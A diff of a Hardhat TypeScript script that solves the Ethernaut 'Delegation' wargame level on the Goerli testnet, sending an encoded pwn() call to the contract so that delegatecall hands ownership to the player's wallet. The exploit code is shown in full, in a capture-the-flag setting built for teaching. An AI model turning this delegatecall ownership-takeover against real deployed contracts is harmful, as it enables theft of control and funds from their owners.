@@ -5,7 +5,10 @@ import { ethers } from "hardhat";
 const attackDelegation = async () => {
     // change contract addresses here.
     const delegationAddress = "0x063380A0ba27e70539Bb1873dCFc82C47583a040"; //type "await contract.address()" in ethernaut console
-    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
+    // const player = ""; //place your player address here (you may type player in ethernaut console)
+    const args: [] = [];
+    const player = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
     // Vulnerability from being able to change owner of contract by using
@@ -40,9 +43,7 @@ const attackDelegation = async () => {
     // using my custom rpc stored in .env (for privacy)
     const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
     const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
-    const PRIVATE_KEY =
-        process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
-    const wallet = new Wallet(PRIVATE_KEY, provider);
+    const wallet = new Wallet(player, provider);
     // endoding function here
     console.log("Encoding function signature...");
     const iface = new ethers.utils.Interface(["function pwn()"]);
@@ -61,7 +62,7 @@ const attackDelegation = async () => {
     // const data = signature.toString();
 
     const tx = await wallet.sendTransaction({
-        from: player,
+        from: wallet.address,
         to: delegationAddress,
         data: signature,
     });
@@ -71,10 +72,10 @@ const attackDelegation = async () => {
     console.log("Checking if player is now owner...");
     const newOwner = await contract.owner();
     console.log(`Contract Owner is now: ${newOwner}`);
-    const owner = newOwner === player;
+    const owner = newOwner === wallet.address;
     console.log(`Player is now owner: ${owner}`);
     if (owner) {
-        console.log("Congrats! Player is now the new owner...");
+        console.log("Congrats Level passed! Player is now the new owner...");
         console.log("Done...submit in ethernaut");
     } else {
         console.log("Player is not owner, please review code above");
